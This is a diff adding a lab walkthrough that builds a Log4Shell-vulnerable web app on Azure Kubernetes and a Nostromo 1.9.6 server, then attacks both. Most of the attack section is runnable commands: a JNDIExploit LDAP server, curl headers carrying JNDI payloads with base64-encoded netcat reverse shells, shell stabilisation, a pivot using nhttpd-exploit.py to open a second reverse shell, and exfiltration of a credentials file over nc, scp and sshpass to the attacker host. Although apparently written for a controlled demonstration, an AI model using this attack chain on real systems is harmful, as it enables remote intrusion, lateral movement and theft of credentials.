@@ -1,0 +1,283 @@
+Preparation Steps
+=====================
+=====================
+
+SRV-UB-01 (Attacker)
+=====================
+
+apt-get update
+apt-get install net-tools python ncat default-jre -y
+winscp JAVA Exploit & nhttpd-exploit.py
+chmod 755 nhttpd-exploit.py
+
+
+WebApp (Victim)
+===============
+
+On Computer with Docker Desktop, Visual Code and Azure CLI run:
+
+Download and create container image
+-----------------------------------
+
+git clone https://github.com/christophetd/log4shell-vulnerable-app.git
+open dockerfiles and save following info
+
+FROM gradle:7.3.1-jdk17 AS builder
+COPY --chown=gradle:gradle . /home/gradle/src
+WORKDIR /home/gradle/src
+RUN gradle bootJar --no-daemon
+
+FROM openjdk:8u181-jdk-alpine
+EXPOSE 8080
+RUN mkdir /app
+RUN apk update
+RUN apk add bash
+COPY --from=builder /home/gradle/src/build/libs/*.jar /app/spring-boot-application.jar
+CMD ["java", "-jar", "/app/spring-boot-application.jar"]
+
+docker build -t webapp .
+
+Upload image to Azure ACR
+-------------------------
+az login
+az acr login --name imagerepository01.azurecr.io
+docker tag webapp imagerepository01.azurecr.io/webapp
+docker push imagerepository01.azurecr.io/webapp
+
+Create AKS container based on image
+------------------------------------
+
+open webapp.yml and modify image with your ACR url and save changes
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: webapp
+  labels:
+    app: webapp
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: webapp
+  template:
+    metadata:
+      labels:
+        app: webapp
+    spec:
+      containers:
+      - name: webapp
+        image: imagerepository01.azurecr.io/webapp:latest
+        ports:
+        - containerPort: 8080
+
+
+az aks get-credentials -g LOG4J-ATTACK-DEMO -n aks-cluster-01
+kubectl apply -f webapp.yml
+kubectl get pods
+
+Open Bash check IP
+kubectl exec --stdin --tty webapp-xxxxxxx -- /bin/bash
+
+kubectl exec --stdin --tty webapp-6c9775d7f8-gldwn -- /bin/bash
+
+10.1.2.51
+
+SRV-UB-02 (Victim)
+==================
+
+Create fake sensitive file
+--------------------------
+cd /tmp
+vi creds
+
+credentials
+------------
+username=test
+password=test
+
+Do not store!
+
+
+winscp nostromo-1.9.6.tar.gz
+tar -xf nostromo-1.9.6.tar.gz
+
+wget https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-3.4.2.tar.gz
+tar -xf libressl-3.4.2.tar.gz
+
+sudo apt-get update
+sudo apt-get install make automake autoconf git libtool perl net-tools ncat -y
+
+cd /libressl-3.4.2
+
+./configure --disable-dependency-tracking
+make check
+make install
+
+cd /nostromo-1.9.6
+make
+make install
+
+chmod 777 /var/nostromo/logs
+wincsp nhttpd.conf /var/nostromo/conf
+
+ln -s libssl.so.3 libssl.so
+sudo ldconfig
+nhttpd
+
+Check nhttpd is listening on port 8080
+
+netstat -an | more
+
+127.0.0.1:8080
+
+
+Attack Steps
+=====================
+=====================
+
+SRV-UB-01 (Attacker)
+=====================
+
+webapp-IP= 10.1.2.51
+SRV-UB-01-IP= 10.1.1.4
+SRV-UB-02-IP= 10.1.0.4
+
+Listen for incomming connections
+--------------------------------
+nc -lvnp 443
+
+Open other putty session
+
+Start malicious ldap and http server for log4j attack
+------------------------------------------------------
+cd JNDIExploit.v1.2
+
+
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.1.1.4 -p 8888
+
+
+Open other putty session
+
+Execute Log4j exploit and send reverse shell command
+------------------------------------------------------
+
+Browse to https://www.base64encode.org/
+Create base64 encode for below command
+
+nc -nv 10.1.1.4 443 -e /bin/bash
+Copy replace XXXX with base64 output
+
+curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/XXXXXX}'
+bmMgLW52IDEwLjEuMS40IDQ0MyAtZSAvYmluL2Jhc2g=
+
+curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQ0MyAtZSAvYmluL2Jhc2g=}'
+
+
+go back to first putty session and check for incomming session
+
+Confirm access to container
+---------------------------
+ifconfig
+whoami
+
+apk add python
+
+Make revershell interactive
+-------------------------------
+python -c "import pty; pty.spawn('/bin/bash')"
+
+CTRL-Z brings back session to SRV-UB-01
+stty raw -echo 
+stty raw -echo;fg
+
+Start new putty session with SRV-UB-01
+
+Enable local http server
+-------------------------
+browse to folder where nhttpd-exploit.py is stored
+run python -m SimpleHTTPServer 8080
+go back to putty session with reverse shell to container
+
+
+WebApp (Victim)
+===============
+
+wget 10.1.1.4:8080/nhttpd-exploit.py
+chmod 755 nhttpd-exploit.py
+
+confirm open port 8080
+curl 10.1.0.4:8080
+
+start listen in container reverse shell
+nc -lvnp 443
+
+Create another putty connection with SRV-UB-01-IP and establish a second reverse shell to the container
+
+On SRV-UB-01 start new listener for incomming connections
+--------------------------------
+nc -lvnp 4343
+
+Open putty session used to execute Log4j exploit and run a modified command
+---------------------------------------------------------------------------
+Browse to https://www.base64encode.org/
+Create base64 encode for below command
+
+nc -nv 10.1.1.4 4343 -e /bin/bash
+Copy replace XXXX with base64 output
+
+curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/XXXXXX}'
+bmMgLW52IDEwLjEuMS40IDQzNDMgLWUgL2Jpbi9iYXNo
+
+curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQzNDMgLWUgL2Jpbi9iYXNo}'
+
+go back to the putty session waiting for sessions on port 4343 and check for incomming sessions
+
+Make revershell interactive
+-------------------------------
+python -c "import pty; pty.spawn('/bin/bash')"
+
+CTRL-Z brings back session to SRV-UB-01
+stty raw -echo 
+stty raw -echo;fg
+
+In the new reverse shell connection run:
+
+python ./nhttpd-exploit.py 10.1.0.4 8080 'ncat -nv 10.1.2.51 443 -e /bin/bash'
+
+now start an nc to listen for incomming files
+
+nc -l -p 443 > creds
+
+Go back to the first webapp revershell and check for an incomming session
+
+SRV-UB-02 (Victim)
+==================
+
+Make revershell interactive
+-------------------------------
+python -c "import pty; pty.spawn('/bin/bash')"
+
+Do NOT use CTLZ-Z!!
+
+In the reverse shell connection from SRV-UB-02 run
+
+Exfiltrate creds file
+cd /tmp
+nc -w 3 10.1.2.51 443 < creds
+
+
+WebApp (Victim)
+===============
+
+apk add openssh
+scp /creds sdr@10.1.1.4:/tmp/creds2
+
+
+Onliner example
+apk add sshpass
+
+sshpass -p 'XXXXX' scp -o "StrictHostKeyChecking no" /creds sdr@10.1.1.4:/tmp/creds
+
+
+
